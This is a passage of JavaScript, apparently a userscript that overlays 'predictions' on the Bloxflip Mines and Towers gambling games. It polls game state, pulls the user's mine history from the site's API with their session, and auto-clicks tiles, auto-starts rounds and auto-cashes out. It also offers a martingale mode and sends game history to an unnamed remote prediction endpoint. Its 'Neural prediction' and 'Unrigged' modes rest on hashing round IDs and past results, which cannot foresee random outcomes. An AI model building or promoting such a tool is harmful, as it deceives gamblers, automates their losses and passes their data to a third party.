 if (!p || !p.isSuggestedSafe || p.isRevealed) return;
 clickBloxFlipTile(idx);
 });
 }
 const ridBtn = panel.querySelector('#_01studios_round_id');
 if (ridBtn) {
 ridBtn.addEventListener('click', () => {
 const uuid = ridBtn._fullUUID;
 if (!uuid) { updateStatus('No round ID yet — start a game first.', TEXT_DIM); return; }
 const notif = document.createElement('div');
 notif.style.cssText = `position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1a1a1a;border:1px solid ${accentColor}44;color:${accentColor};padding:10px 18px;border-radius:10px;font-size:11px;font-family:monospace;z-index:2147483648;box-shadow:0 4px 20px rgba(0,0,0,0.8);letter-spacing:1px;cursor:pointer;`;
 notif.textContent = uuid;
 notif.title = 'Click to copy';
 notif.addEventListener('click', () => { navigator.clipboard.writeText(uuid).catch(()=>{}); notif.textContent = 'Copied!'; setTimeout(()=>notif.remove(), 1000); });
 document.body.appendChild(notif);
 setTimeout(() => notif.remove(), 4000);
 });
 }
        // Rain joiner toggle - mines
        var _mRainTgl = panel.querySelector('#_01studios_rain_toggle');
        if (_mRainTgl) _mRainTgl.addEventListener('click', function() {
            _rainAutoJoin = !_rainAutoJoin;
            this.style.background = _rainAutoJoin ? '#00c97a' : '#333';
            var th = this.querySelector('div'); if(th) th.style.left = _rainAutoJoin ? '18px' : '2px';
            var st = document.getElementById('_01studios_rain_status');
            if (st) { st.textContent = _rainAutoJoin ? 'Watching' : 'Off'; st.style.color = _rainAutoJoin ? '#00c97a' : '#e05555'; }
        });

 panel.querySelector('#_01studios_regen').addEventListener('click',()=>{
 if (!currentGameData) { updateStatus('No active game to re-predict.', TEXT_DIM); return; }
 triggerPrediction(lastUncovered || [], []);
 updateStatus('Prediction refreshed.', accentColor);
 setTimeout(()=>updateStatus('Waiting for game...', TEXT_DIM), 1500);
 });
 panel.querySelector('#_01studios_newgame').addEventListener('click',()=>{prediction=[];lastUUID=null;lastActive=false;lastUncovered=[];currentGameData=null;updateGrid();clearBoardOverlay();updateStatus('Ready — waiting for game...',TEXT_DIM);});
 panel.querySelector('#_01studios_base_bet')?.addEventListener('change',e=>{baseBet=parseFloat(e.target.value)||1;updateSuggestedBet();});
 panel.querySelector('#_01studios_stop_loss')?.addEventListener('change',e=>{settings.stopLoss=parseFloat(e.target.value)||0;saveSettings();});
 panel.querySelector('#_01studios_take_profit')?.addEventListener('change',e=>{settings.takeProfit=parseFloat(e.target.value)||0;saveSettings();});
 document.addEventListener('keydown',e=>{if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;if((e.key==='p'||e.key==='P')&&gameRunning)triggerPrediction(lastUncovered,[]);if(e.key==='m'||e.key==='M')panel.querySelector('#_01studios_minimize').click();if(e.key==='1'){currentMode='smart';updateModeButtons();}if(e.key==='2'){currentMode='safe';updateModeButtons();}if(e.key==='3'){currentMode='aggressive';updateModeButtons();}if(e.key==='4'){currentMode='martingale';updateModeButtons();}});
 }

 let _minesPoller = null;
 function startPoller() {
 if (_minesPoller) clearInterval(_minesPoller);
 _minesPoller = setInterval(() => {
 if (settings.autoSync !== false && !gameRunning) {
 const nm = readMineCount();
 if (nm !== mineCount) {
 mineCount = nm;
 const el = document.getElementById('_01studios_mine_count');
 if (el) el.textContent = mineCount;
 updateStrategyBar(lastUncovered.length);
 updateTileButtons();
 }
 }

 const state = getGameState();
 if (!state) return;
 const game = state.game;

 if (!game) {
 if (gameRunning) {
 gameRunning = false;
 autoPressActive = false;
 updateStatus(autoPressEnabled ? ' AUTO ON — waiting for next game...' : 'Waiting for game...', autoPressEnabled ? accentColor : '#888');
 }
 return;
 }

 const { uuid, active, exploded, minesAmount, uncoveredLocations = [], betAmount } = game;
 const mines = minesAmount || mineCount;

 if (uuid !== lastUUID) {
 if (lastUUID !== null && currentGameData !== null && !currentGameData._recorded) {
 currentGameData._recorded = true;
 const prev = currentGameData;
 const prevMult = lastMult || 1;
 if (prev.exploded === true) {
 if (!prev._lossRecorded) {
 const minePos = prev.badMineUncovered;
 const prevMines = prev.minesAmount || mineCount;
 sessionLosses++; lossStreak++; winStreak = 0;
 sessionProfit -= (prev.betAmount || 0);
 const prevMinePosArr = minePos >= 0 ? [minePos] : [];
 analyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'loss', mines: prevMines, mult: prevMult, uncovered: (prev.uncoveredLocations || []).length, minePos, minePosArr: prevMinePosArr, uncoveredSafe: prev.uncoveredLocations || [], bet: prev.betAmount, uuid: lastUUID });
 recordMineHistory(prevMines, prevMinePosArr, 'loss', lastUUID, prev.uncoveredLocations || []);
 updateStats(prevMult); updateAnalyticsLog();
 }
 } else if (prev.active === false && prev.exploded === false) {
 if (!prev._winRecorded) {
 const prevMines = prev.minesAmount || mineCount;
 sessionWins++; winStreak++; lossStreak = 0;
 const prevBet = prev.betAmount || 0;
 const prevPayout = lastPayoutAmount > 0 ? lastPayoutAmount : 0;
 const prevProfit = prevPayout > 0 ? (prevPayout - prevBet) : ((prevMult - 1) * prevBet);
 const prevDispMult = prevPayout > 0 && prevBet > 0 ? (prevPayout / prevBet) : prevMult;
 sessionProfit += prevProfit;
 analyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'win', mines: prevMines, mult: prevDispMult, uncovered: (prev.uncoveredLocations || []).length, minePosArr: [], uncoveredSafe: prev.uncoveredLocations || [], bet: prev.betAmount, uuid: lastUUID });
 recordMineHistory(prevMines, [], 'win', lastUUID, prev.uncoveredLocations || []);
 updateStats(prevDispMult); updateAnalyticsLog();
 }
 } else if (prev.active === true && prev.exploded !== true && !prev._winRecorded) {
 const prevMines = prev.minesAmount || mineCount;
 sessionWins++; winStreak++; lossStreak = 0;
 const prevBet2 = prev.betAmount || 0;
 const prevPayout2 = lastPayoutAmount > 0 ? lastPayoutAmount : 0;
 const prevProfit2 = prevPayout2 > 0 ? (prevPayout2 - prevBet2) : ((prevMult - 1) * prevBet2);
 const prevDispMult2 = prevPayout2 > 0 && prevBet2 > 0 ? (prevPayout2 / prevBet2) : prevMult;
 sessionProfit += prevProfit2;
 analyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'win', mines: prevMines, mult: prevDispMult2, uncovered: (prev.uncoveredLocations || []).length, minePosArr: [], uncoveredSafe: prev.uncoveredLocations || [], bet: prev.betAmount, uuid: lastUUID });
 recordMineHistory(prevMines, [], 'win', lastUUID, prev.uncoveredLocations || []);
 updateStats(prevDispMult2); updateAnalyticsLog();
 }
 }

 lastUUID = uuid;
 lastActive = active;
 lastUncovered = [];
 mineCount = mines;
 currentGameData = game;
 prediction = [];
 lastPayoutAmount = 0;
 autoPressActive = false;
 _minesSequenceLock = false;
 _minesSequenceComplete = false;
 clearBoardOverlay();
 updateGrid();

 if (!exploded) {
 gameRunning = true;
 updateStatus(`LIVE GAME — ${mines} mines`, '#00c97a');
 const rid = document.getElementById('_01studios_round_id');
 if (rid) { rid.textContent = 'ROUND ' + uuid.substring(0, 8) + '...'; rid.style.color = accentColor; }
 try { const ridBtn = document.getElementById('_01studios_round_id'); if (ridBtn) ridBtn._fullUUID = uuid; } catch {}
 _sessionGamesPlayed++;
 if (settings.autoPredict !== false) {
 const capturedGame = game;
 setTimeout(() => {
 currentGameData = capturedGame;
 triggerPrediction([], []);
 }, 100);
 } else {
 updateStrategyBar(0);
 }
 updateStats(state.multiplier);
 } else {
 gameRunning = false;
 autoPressActive = false;
 updateStatus('Waiting for game...', '#888');
 updateStats(state.multiplier);
 }
 return;
 }

 if (uuid === lastUUID && state.multiplier) lastMult = state.multiplier;
 if (uuid === lastUUID && state.payoutAmount > 0) lastPayoutAmount = state.payoutAmount;

 if (uuid === lastUUID && active === true && !exploded) {
 const newCells = uncoveredLocations.filter(i => !lastUncovered.includes(i));
 if (newCells.length > 0) {
 lastUncovered = [...uncoveredLocations];
 currentGameData = game;
 if (prediction.length > 0) {
 uncoveredLocations.forEach(idx => {
 if (prediction[idx]) {
 prediction[idx].isRevealed = true;
 prediction[idx].isSafe = true;
 prediction[idx].isMine = false;
 prediction[idx].isSuggestedSafe = false;
 }
 });
 }
 if (uncoveredLocations.length >= targetTiles) {
 updateGrid();
 injectOverlayStyles();
 updateBoardOverlay(0);
 updateStatus(`* TARGET REACHED — cash out now! (${uncoveredLocations.length}/${targetTiles} tiles)`, accentColor);
 const canCashout = !autoPressEnabled || _minesSequenceComplete;
 if (autoCashoutEnabled && canCashout && !autoPressActive && !_minesSequenceLock) {
 setTimeout(() => {
 if (!autoPressActive && !_minesSequenceLock) performAutoCashout();
 }, 400);
 }
 } else {
 updateGrid();
 injectOverlayStyles();
 updateBoardOverlay(0);
 updateStatus(`LIVE — ${uncoveredLocations.length} revealed · ${mines} mines`, '#00c97a');
 }
 updateStrategyBar(uncoveredLocations.length);
 updateStats(state.multiplier);
 checkCashoutAlert(uncoveredLocations.length);
 }
 return;
 }

 if (uuid === lastUUID && exploded === true && gameRunning === true) {
 lastActive = false;
 gameRunning = false;
 autoPressActive = false;
 game._lossRecorded = true;
 game._recorded = true;
 currentGameData = game;
 const minePos = game.badMineUncovered;
 if (prediction.length > 0 && minePos >= 0) {
 prediction[minePos] = { index: minePos, isMine: true, isRevealed: true, isSafe: false, isSuggestedSafe: false };
 }
 prediction = []; currentGameData = null; updateGrid(); clearBoardOverlay();
 sessionLosses++; lossStreak++; winStreak = 0;
 sessionProfit -= (betAmount || 0);
 const lossMinePosArr = minePos >= 0 ? [minePos] : [];
 analyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'loss', mines, mult: state.multiplier, uncovered: uncoveredLocations.length, minePos, minePosArr: lossMinePosArr, uncoveredSafe: uncoveredLocations, bet: betAmount, uuid });
 recordMineHistory(mines, lossMinePosArr, 'loss', uuid, uncoveredLocations || []);
 updateStatus(` Mine hit — cell ${minePos + 1} · Loss streak: ${lossStreak}`, '#e05555');
 updateStats(state.multiplier); updateAnalyticsLog();
 checkRigDetection('loss', minePos, mines, betAmount || 0);
 if (settings.stopLoss > 0 && Math.abs(sessionProfit) >= settings.stopLoss) {
 updateStatus('STOP LOSS HIT — stop playing!', '#e05555');
 } else if (autoStartEnabled) {
 setTimeout(() => performAutoStart(), 1200);
 }
 return;
 }

 if (uuid === lastUUID && active === false && exploded === false && gameRunning === true) {
 lastActive = false;
 gameRunning = false;
 autoPressActive = false;
 game._winRecorded = true;
 game._recorded = true;
 currentGameData = game;
 sessionWins++; winStreak++; lossStreak = 0;
 const domPayout = lastPayoutAmount > 0 ? lastPayoutAmount : (state.payoutAmount || 0);
 const bet = betAmount || 0;
 const effectiveMult = state.multiplier || lastMult || 1;
 const profit = domPayout > 0 ? (domPayout - bet) : ((effectiveMult - 1) * bet);
 const displayMult = domPayout > 0 && bet > 0 ? (domPayout / bet) : effectiveMult;
 sessionProfit += profit;
 analyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'win', mines, mult: displayMult, uncovered: uncoveredLocations.length, minePosArr: [], uncoveredSafe: uncoveredLocations, bet: betAmount, uuid });
 recordMineHistory(mines, [], 'win', uuid, uncoveredLocations || []);
 clearBoardOverlay(); prediction = []; currentGameData = null;
 updateStatus(`OK Cashed out — ${displayMult.toFixed(2)}x · Win streak: ${winStreak}`, '#00c97a');
 updateStats(displayMult); updateAnalyticsLog();
 checkRigDetection('win', -1, mines, betAmount || 0);
 if (settings.takeProfit > 0 && sessionProfit >= settings.takeProfit) {
 updateStatus(`TAKE PROFIT HIT! +${sessionProfit.toFixed(1)}`, accentColor);
 } else if (autoStartEnabled) {
 setTimeout(() => performAutoStart(), 1200);
 }
 return;
 }
 }, POLL_MS);
 }

 function seedHistoryFromAPI() {
 const SEED_KEY = '_01studios_api_seeded';
 if (sessionStorage.getItem(SEED_KEY)) return;
 sessionStorage.setItem(SEED_KEY, '1');
 try {
 fetch('https://bloxflip.com/api/mines/history?limit=50', {
 credentials: 'include',
 headers: { 'Accept': 'application/json' }
 })
 .then(r => r.ok ? r.json() : null)
 .then(data => {
 if (!data || !Array.isArray(data.data || data)) return;
 const games = data.data || data;
 let seeded = 0;
 for (const g of games) {
 const mines = g.minesAmount || g.mines_amount;
 const locs = g.mineLocations || g.mine_locations || [];
 const uuid = g.uuid || g.id;
 if (!mines || !Array.isArray(locs) || locs.length === 0) continue;
 const existing = getMineHistory(mines, HISTORY_CAP);
 if (existing.some(e => e.uuid === uuid)) continue;
 recordMineHistory(mines, locs, 'api', uuid, []);
 seeded++;
 }
 if (seeded > 0) {
 const el = document.getElementById('_01studios_status_text');
 if (el) el.textContent = `OK History Engine seeded with ${seeded} API games`;
 setTimeout(() => updateStatus('Waiting for game...', TEXT_DIM), 2500);
 }
 })
 .catch(() => {});
 } catch(e) {}
 }

 function launchApp() {
 if(settings.autoPredict===undefined)settings.autoPredict=true;
 if(settings.showRevealed===undefined)settings.showRevealed=true;
 if(settings.autoSync===undefined)settings.autoSync=true;
 saveSettings();
 injectFiberBridge();
 injectOverlayStyles();
 buildGUI();
 updateModeButtons();
 updateGridSizeButtons();
 updateTileButtons();
 startPoller();
 setTimeout(() => seedHistoryFromAPI(), 2000);
 }

 let _launched = false;

 function tryLaunch() {
 if (_launched) return;
 const path = window.location.pathname;
 const onMinesPage = path.includes('/mines');
 const onTowersPage = path.includes('/towers');
 if (!onMinesPage && !onTowersPage) return;
 _launched = true;
 if (onMinesPage) {
 document.getElementById('_01studios_t_panel')?.remove();
 if (tPoller) { clearInterval(tPoller); tPoller = null; }
 launchApp();
 } else {
 document.getElementById('_01studios_panel')?.remove();
 if (_minesPoller) { clearInterval(_minesPoller); _minesPoller = null; }
 launchTowersApp();
 }
 }

 function init() {
 if (!_01_predictorReady) return;
 tryLaunch();
 if (_launched) return;
 let attempts = 0;
 const poller = setInterval(() => { attempts++; tryLaunch(); if (_launched || attempts > 200) clearInterval(poller); }, 300);
 const obs = new MutationObserver(() => { tryLaunch(); if (_launched) obs.disconnect(); });
 obs.observe(document.documentElement, { childList: true, subtree: true });
 }

 // Wait for loader to validate before starting predictor
 // Session timer updater
 setInterval(function() {
 var el = document.getElementById('_01studios_session_timer');
 if (!el) return;
 var ms = Date.now() - _sessionStartTime;
 var s = Math.floor(ms / 1000); var h = Math.floor(s / 3600); s %= 3600; var m = Math.floor(s / 60); s %= 60;
 el.textContent = (h > 0 ? h + 'h ' : '') + (m > 0 ? m + 'm ' : '') + s + 's';
 var gEl = document.getElementById('_01studios_session_games');
 if (gEl) gEl.textContent = _sessionGamesPlayed;
 // Also update towers session
 var tEl = document.getElementById('_01studios_t_session_timer');
 if (tEl) tEl.textContent = (h > 0 ? h + 'h ' : '') + (m > 0 ? m + 'm ' : '') + s + 's';
 var tgEl = document.getElementById('_01studios_t_session_games');
 if (tgEl) tgEl.textContent = _sessionGamesPlayed;
 }, 1000);

 function _01_startPredictor() {
 setTimeout(init, 300);
 setTimeout(function() {
 if (settings.anonMode) applyAnonMode(true);
 if (settings.noChatMode) applyNoChatMode(true);
 }, 1000);
 }
 if (_01_predictorReady) _01_startPredictor();

 const T_DIFF = {
 easy: { cols: 3, mines: 1, rows: 8 },
 normal: { cols: 2, mines: 1, rows: 8 },
 hard: { cols: 3, mines: 2, rows: 8 },
 };

 const T_MULTS = {
 easy: [1.0, 1.42, 2.02, 2.86, 4.05, 5.69, 7.97, 11.10, 15.37],
 normal: [1.0, 1.90, 3.60, 6.80, 12.80, 24.00, 44.80, 83.20, 153.60],
 hard: [1.0, 2.85, 8.10, 22.95, 64.80, 182.25, 510.30, 1421.55, 3936.60],
 };

 let tGame = null;
 let tLastUUID = null;
 let tGameRunning = false;
 let tPrediction = null;
 let tPredRow = -1;
 let tWins = 0, tLosses = 0, tProfit = 0;
 let tWinStreak = 0, tLossStreak = 0;
 let tBetAmount = 25;
 let tDifficulty = 'easy';
 let tPoller = null;
 let tPanelMinimized = false;
 let tIsDragging = false, tDragOffX = 0, tDragOffY = 0;
 let tAutoClickEnabled = false;
 let tAutoClickActive = false;
 let tAutoClickPending = false;
 let tAutoCashoutEnabled = false;
 let tAutoStartEnabled = false;
 let tAutoTarget = 3;
 let tCurrentMode = 'smart';
 let tAnalyticsLog = [];
 let tCurrentGameData = null;
 let tLastCompletedLevels = [];
 let tLastExploded = false;
 let tResultRecorded = false;
 let tLastCashedOut = false;

 function tGetHistory(difficulty) {
 try { return JSON.parse(localStorage.getItem('_01studios_t_hist_' + difficulty) || '[]'); } catch(e) { return []; }
 }
 function tSaveHistory(difficulty, arr) {
 try { localStorage.setItem('_01studios_t_hist_' + difficulty, JSON.stringify(arr.slice(-500))); } catch(e) {}
 }
 function tGetGameCount(difficulty) {
 try { return parseInt(localStorage.getItem('_01studios_t_gc_' + difficulty) || '0'); } catch(e) { return 0; }
 }
 function tSetGameCount(difficulty, n) {
 try { localStorage.setItem('_01studios_t_gc_' + difficulty, String(n)); } catch(e) {}
 }

 function tRecordRound(difficulty, safeCol, result, rowIdx, mineCol) {
 const hist = tGetHistory(difficulty);
 hist.push({
 col: safeCol,
 result,
 row: rowIdx !== undefined ? rowIdx : -1,
 mineCol: mineCol !== undefined ? mineCol : -1,
 ts: Date.now()
 });
 tSaveHistory(difficulty, hist.slice(-800));
 }
 function tGetColumnFrequency(difficulty) {
 const cfg = T_DIFF[difficulty] || T_DIFF.easy;
 const hist = tGetHistory(difficulty);
 const freq = Array(cfg.cols).fill(0);
 hist.forEach(h => { if (h.result === 'win' && h.col >= 0 && h.col < cfg.cols) freq[h.col]++; });
 return freq;
 }

 const T_MODES = [
 { id: 'smart', icon: '', label: 'Smart Mode', sub: 'Neural prediction' },
 { id: 'safe', icon: '', label: 'Low Risk', sub: 'Low risk' },
 { id: 'aggressive', icon: '', label: 'High Risk', sub: 'High reward' },
 { id: 'pattern', icon: '', label: 'Unrigged', sub: 'Pattern tracking' },
 ];

 function _tFNV1a(str) {
 let h = 0x811c9dc5;
 for (let i = 0; i < str.length; i++) { h ^= str.charCodeAt(i); h = Math.imul(h, 0x01000193); }
 return (h >>> 0);
 }
 function _tDjb2(str) {
 let h = 5381;
 for (let i = 0; i < str.length; i++) { h = Math.imul(h, 33) ^ str.charCodeAt(i); }
 return (h >>> 0);
 }
 function _tSDBM(str) {
 let h = 0;
 for (let i = 0; i < str.length; i++) { h = str.charCodeAt(i) + Math.imul(h, 65599); }
 return (h >>> 0);
 }
 function tMultiHash(seed, count) {
 const results = [];
 let h = 0x811c9dc5;
 for (let i = 0; i < seed.length; i++) { h ^= seed.charCodeAt(i); h = Math.imul(h, 0x01000193); }
 for (let n = 0; n < count; n++) {
 h ^= (h >>> 13); h = Math.imul(h, 0x85ebca6b);
 h ^= (h >>> 16); h = Math.imul(h, 0xc2b2ae35);
 h ^= (h >>> 13); results.push(Math.abs(h));
 }
 return results;
 }

 function tBayesianPrior(difficulty, cols, targetRow, windowSize) {
 const hist = tGetHistory(difficulty);
 const counts = new Float64Array(cols).fill(1.0);
 const recent = hist.slice(-windowSize);
 const N = recent.length;
 const DECAY = 0.985;
 recent.forEach((h, idx) => {
 if (h.result !== 'win' || h.row !== targetRow || h.col < 0 || h.col >= cols) return;
 const age = N - 1 - idx;
 counts[h.col] += Math.pow(DECAY, age);
 });
 const total = counts.reduce((a, b) => a + b, 0);
 return counts.map(c => c / total);
 }

 function tOverallPrior(difficulty, cols, windowSize) {
 const hist = tGetHistory(difficulty);
 const counts = new Float64Array(cols).fill(1.0);
 const recent = hist.slice(-windowSize);
 const N = recent.length;
 const DECAY = 0.985;
 recent.forEach((h, idx) => {
 if (h.result !== 'win' || h.col < 0 || h.col >= cols) return;
 const age = N - 1 - idx;
 counts[h.col] += Math.pow(DECAY, age);
 });
 const total = counts.reduce((a, b) => a + b, 0);
 return counts.map(c => c / total);
 }

 function tSequenceScore(cols, completedLevels) {
 const scores = new Float64Array(cols).fill(1.0);
 const levels = completedLevels || [];
 const len = levels.length;
 if (len === 0) return scores;
 const lastCol = levels[len - 1];
 if (lastCol >= 0 && lastCol < cols) scores[lastCol] = 0.20;
 if (len >= 2) {
 const prevCol = levels[len - 2];
 if (prevCol >= 0 && prevCol < cols && prevCol !== lastCol) {
 scores[prevCol] = Math.min(scores[prevCol], 0.55);
 }
 }
 return scores;
 }

 const _tPredHistory = [];
 function tCooldownScore(cols, predictedCol) {
 const scores = new Float64Array(cols).fill(1.0);
 const len = _tPredHistory.length;
 _tPredHistory.forEach((col, idx) => {
 if (col < 0 || col >= cols) return;
 const age = len - 1 - idx;
 const penalty = 0.30 + (age / 5) * 0.50;
 scores[col] = Math.min(scores[col], penalty);
 });
 return scores;
 }
 function tRecordPrediction(col) {
 _tPredHistory.push(col);
 if (_tPredHistory.length > 6) _tPredHistory.shift();
 }

 function tHashConsensus(uuid, difficulty, rowIndex, cols) {
 const seed = (uuid || '') + ':' + rowIndex + ':' + difficulty;
 const c1 = _tFNV1a(seed) % cols;
 const c2 = _tDjb2(seed) % cols;
 const c3 = _tSDBM(seed) % cols;
 const scores = new Float64Array(cols).fill(0.5);
 if (c1 === c2 || c1 === c3) {
 scores[c1] = 1.0;
 for (let i = 0; i < cols; i++) { if (i !== c1) scores[i] = 0.30; }
 } else if (c2 === c3) {
 scores[c2] = 1.0;
 for (let i = 0; i < cols; i++) { if (i !== c2) scores[i] = 0.30; }
 }
 return scores;
 }

 function tMarkovScore(difficulty, cols, targetRow, prevCol) {
 if (targetRow === 0 || prevCol === undefined || prevCol < 0) {
 return new Float64Array(cols).fill(1.0 / cols);
 }
 const hist = tGetHistory(difficulty);
 const counts = new Float64Array(cols).fill(0.1);
 let total = 0;

 for (let i = 1; i < hist.length; i++) {
 const h1 = hist[i-1];
 const h2 = hist[i];
 if (h2.row === targetRow && h1.row === targetRow - 1 && h1.col === prevCol && Math.abs(h2.ts - h1.ts) < 10000) {
 if (h2.result === 'win' && h2.col >= 0 && h2.col < cols) {
 counts[h2.col]++;
 total++;
 } else if (h2.result === 'loss' && h2.mineCol >= 0 && h2.mineCol < cols) {
 for (let c = 0; c < cols; c++) {
 if (c !== h2.mineCol) { counts[c] += 0.5; total += 0.5; }
 }
 }
 }
 }

 if (total < 3) return new Float64Array(cols).fill(1.0 / cols);
 const sum = counts.reduce((a, b) => a + b, 0) || 1;
 return counts.map(c => c / sum);
 }

 function tDriftScore(difficulty, cols, targetRow, prevCol) {
 if (targetRow === 0 || prevCol === undefined || prevCol < 0) {
 return new Float64Array(cols).fill(1.0 / cols);
 }
 const hist = tGetHistory(difficulty);
 const driftCounts = { '-1': 0.1, '0': 0.1, '1': 0.1 };
 let total = 0;

 for (let i = 1; i < hist.length; i++) {
 const h1 = hist[i-1];
 const h2 = hist[i];
 if (h2.row === targetRow && h1.row === targetRow - 1 && Math.abs(h2.ts - h1.ts) < 10000) {
 const actualSafe = h2.result === 'win' ? h2.col : -1;
 if (actualSafe !== -1) {
 const drift = Math.sign(actualSafe - h1.col);
 driftCounts[String(drift)]++;
 total++;
 }
 }
 }

 const scores = new Float64Array(cols);
 const driftSum = driftCounts['-1'] + driftCounts['0'] + driftCounts['1'];
 for (let c = 0; c < cols; c++) {
 const drift = Math.sign(c - prevCol);
 scores[c] = driftCounts[String(drift)] / driftSum;
 }
 return scores;
 }

 async function tPredict(uuid, difficulty, completedLevels) {
 var r = await _01_call('/predict/towers', {
 uuid: uuid, difficulty: difficulty,
 completedLevels: completedLevels || [],
 mode: tCurrentMode, history: tGetHistory()
 });
 if (r && !r.error && r.predictedCol !== undefined) {
 return r.predictedCol;
 }
 return Math.floor(Math.random() * (difficulty === 'hard' ? 2 : difficulty === 'medium' ? 3 : 4));
 }

 function tWinRateScores(difficulty, cols, windowSize) {
 return Array.from(tOverallPrior(difficulty, cols, windowSize));
 }
 function tRowWinRateScores(difficulty, cols, targetRow) {
 return Array.from(tBayesianPrior(difficulty, cols, targetRow, 500));
 }

 function tInjectStyles() {
 const id = '_01studios_t_styles';
 let s = document.getElementById(id);
 if (!s) { s = document.createElement('style'); s.id = id; document.head.appendChild(s); }
 const pc = accentColor;
 s.textContent = `
 @keyframes _01studios_t_pulse {
 0%,100% { box-shadow: 0 0 0 2px ${pc}, 0 0 18px ${pc}99, inset 0 0 10px ${pc}22; }
 50% { box-shadow: 0 0 0 2px ${pc}cc, 0 0 28px ${pc}cc, inset 0 0 18px ${pc}33; }
 }
	 ._01studios_t_marker {
	 position: absolute !important;
	 top: 50% !important; left: 50% !important;
	 transform: translate(-50%, -50%) !important;
	 width: 100% !important; height: 100% !important;
	 z-index: 99999 !important;
	 pointer-events: none !important;
	 border-radius: inherit !important;
	 border: 2px solid ${pc} !important;
	 background: ${pc}18 !important;
	 animation: _01studios_t_pulse 1.4s ease-in-out infinite !important;
	 display: flex !important;
	 align-items: center !important;
	 justify-content: center !important;
	 }
 ._01studios_t_badge {
 background: ${pc};
 color: #000;
 font-size: 12px;
 font-weight: 900;
 width: 24px;
 height: 24px;
 border-radius: 50%;
 display: flex;
 align-items: center;
 justify-content: center;
 font-family: 'Segoe UI', system-ui, sans-serif;
 box-shadow: 0 2px 8px rgba(0,0,0,0.6);
 pointer-events: none;
 }
 `;
 }

 function tClearOverlay() {
 document.querySelectorAll('._01studios_t_marker').forEach(e => e.remove());
 }

 function tGetActiveRowEl() {
 if (!tGame) return null;
 const cfg = T_DIFF[tGame.difficulty] || T_DIFF.easy;

 const allRows = [...document.querySelectorAll('[class*="towersGameRow"]')];

 const hasMultiplierText = b => /^[\d,]+(\.[\d]+)?$/.test(b.textContent.trim());
 const tileRows = allRows.filter(r => {
 const btns = [...r.querySelectorAll('button')];
 if (btns.length !== cfg.cols) return false;
 return btns.some(hasMultiplierText);
 });

 if (tileRows.length > 0) {
 return tileRows[tileRows.length - 1];
 }

 const fallback = allRows.filter(r => r.querySelectorAll('button').length === cfg.cols);
 return fallback.length > 0 ? fallback[fallback.length - 1] : null;
 }

 function tDrawOverlay(colIndex) {
 tClearOverlay();
 if (colIndex === null || colIndex === undefined || colIndex < 0) return;
 if (!tGame || !tGame.active) return;

 const activeRow = tGetActiveRowEl();
 if (!activeRow) return;

 const btns = activeRow.querySelectorAll('button');
 if (!btns || !btns[colIndex]) return;

 const btn = btns[colIndex];
 btn.style.position = 'relative';
 btn.style.overflow = 'visible';

 const marker = document.createElement('div');
 marker.className = '_01studios_t_marker';
 const badge = document.createElement('div');
 badge.className = '_01studios_t_badge';
 badge.textContent = '*';
 marker.appendChild(badge);
 btn.appendChild(marker);
 }

 function tUpdateAutoClickBtn() {
 const btn = document.getElementById('_01studios_t_autoclick');
 if (!btn) return;
 if (tAutoClickEnabled) {
 btn.textContent = '⏹ AUTO ON';
 btn.style.borderColor = accentColor;
 btn.style.color = accentColor;
 btn.style.background = `linear-gradient(135deg,${accentColor}22,${accentColor}44)`;
 } else {
 btn.textContent = 'AUTO CLICK';
 btn.style.borderColor = '#333';
 btn.style.color = TEXT_DIM;
 btn.style.background = '#1a1a1a';
 }
 }

 function tUpdateAutoCashoutBtn() {
 const btn = document.getElementById('_01studios_t_autocashout');
 if (!btn) return;
 if (tAutoCashoutEnabled) {
 btn.textContent = '⏹ CASHOUT ON';
 btn.style.borderColor = '#00c97a';
 btn.style.color = '#00c97a';
 btn.style.background = 'linear-gradient(135deg,#00c97a22,#00c97a44)';
 } else {
 btn.textContent = 'AUTO CASH';
 btn.style.borderColor = '#333';
 btn.style.color = TEXT_DIM;
 btn.style.background = '#1a1a1a';
 }
 }

 function tUpdateAutoStartBtn() {
 const btn = document.getElementById('_01studios_t_autostart');
 if (!btn) return;
 if (tAutoStartEnabled) {
 btn.textContent = '⏹ START ON';
 btn.style.borderColor = '#00c97a';
 btn.style.color = '#00c97a';
 btn.style.background = 'linear-gradient(135deg,#00c97a22,#00c97a44)';
 } else {
 btn.textContent = 'AUTO START';
 btn.style.borderColor = '#333';
 btn.style.color = TEXT_DIM;
 btn.style.background = '#1a1a1a';
 }
 }

 function tClickEl(el) {
 if (!el || el.disabled) return;
 const pageWin = (typeof unsafeWindow !== 'undefined') ? unsafeWindow : window;
 el.focus();
 ['pointerdown','mousedown','pointerup','mouseup','click'].forEach(type =>
 el.dispatchEvent(new MouseEvent(type, { bubbles: true, cancelable: true, view: pageWin }))
 );
 }

 function tDoAutoClick(attempt) {
 attempt = attempt || 0;
 const maxAttempts = 10;
 const retryMs = 250;

 if (!tAutoClickEnabled) return;
 if (!tGame || !tGame.active || tGame.exploded) return;
 if (tPrediction === null) return;

 if (tAutoClickActive && attempt === 0) return;

 const rowsDone = (tGame.completedLevels || []).length;

 if (tAutoCashoutEnabled && rowsDone >= tAutoTarget) {
 if (tAutoClickActive) {
 setTimeout(() => tDoAutoClick(attempt), 100);
 return;
 }
 setTimeout(tPerformCashout, 400);
 return;
 }

 const cfg = T_DIFF[tGame.difficulty] || T_DIFF.easy;
 if (rowsDone >= cfg.rows) return;

 const activeRow = tGetActiveRowEl();
 if (!activeRow) {
 if (attempt < maxAttempts) setTimeout(() => tDoAutoClick(attempt + 1), retryMs);
 return;
 }

 const btns = [...activeRow.querySelectorAll('button')].filter(b => !b.disabled);
 if (!btns.length) {
 if (attempt < maxAttempts) setTimeout(() => tDoAutoClick(attempt + 1), retryMs);
 return;
 }

 const col = Math.min(tPrediction, btns.length - 1);
 const btn = btns[col];
 if (!btn) {
 if (attempt < maxAttempts) setTimeout(() => tDoAutoClick(attempt + 1), retryMs);
 return;
 }

 tAutoClickActive = true;
 const lockTimeout = setTimeout(() => { tAutoClickActive = false; }, 3000);

 const delay = 400 + Math.random() * 300;
 setTimeout(() => {
 if (!tGame || !tGame.active || !tAutoClickEnabled || tGame.exploded) {
 tAutoClickActive = false;
 clearTimeout(lockTimeout);
 return;
 }

 tClickEl(btn);

 }, delay);
 }

 function tPerformCashout(attempt) {
 attempt = attempt || 0;
